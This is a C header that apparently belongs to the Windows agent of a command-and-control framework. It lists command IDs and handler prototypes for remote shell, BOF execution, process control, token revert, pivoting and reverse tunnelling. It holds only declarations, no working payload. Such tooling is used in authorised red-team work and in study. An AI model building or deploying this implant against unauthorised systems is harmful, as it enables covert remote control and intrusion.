#pragma once

#include <windows.h>
#include "Packer.h"
#include "Agent.h"

#define COMMAND_CAT		     24
#define COMMAND_CD		     8
#define COMMAND_CP           12
#define COMMAND_DISKS        15
#define COMMAND_EXEC_BOF     50
#define COMMAND_EXEC_BOF_OUT 51
#define COMMAND_GETUID       22
#define COMMAND_JOBS_LIST	 46
#define COMMAND_JOBS_KILL    47
#define COMMAND_PWD          4
#define COMMAND_LS		     14
#define COMMAND_MV		     18
#define COMMAND_MKDIR	     27
#define COMMAND_PROFILE      21
#define COMMAND_PS_LIST      41
#define COMMAND_PS_KILL      42
#define COMMAND_PS_RUN       43
#define COMMAND_TERMINATE    10
#define COMMAND_REV2SELF     23
#define COMMAND_RM           17
#define COMMAND_UPLOAD       33

#define COMMAND_SHELL_START  71
#define COMMAND_SHELL_WRITE  72
#define COMMAND_SHELL_CLOSE  73
#define COMMAND_SHELL_ACEPT  74


#define COMMAND_SAVEMEMORY 0x2321
#define COMMAND_ERROR      0x1111ffff

typedef struct _Agent Agent;

typedef struct _Commander {
	Agent* agent;
} Commander;

Commander* Commander_Create(Agent* agent);
void Commander_ProcessCommandTasks(Commander* self, BYTE* recv, ULONG recv_size, Packer* outPacker);

void Commander_CmdCat(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdCd(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdCp(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdDisks(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdDownload(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdDownloadState(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdExecBof(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdGetUid(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdJobsList(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdJobsKill(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdLink(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdLs(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdMkdir(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdMv(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdPivotExec(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdProfile(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdPsList(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdPsKill(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdPsRun(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdPwd(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdRev2Self(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdRm(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdShellStart(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdShellWrite(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTerminate(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgConnectTCP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgConnectUDP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgWriteTCP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgWriteUDP(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgResume(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgPause(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgClose(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdTunnelMsgReverse(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdUnlink(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_CmdUpload(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);

void Commander_CmdSaveMemory(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker);
void Commander_Exit(Commander* self, Packer* outPacker);
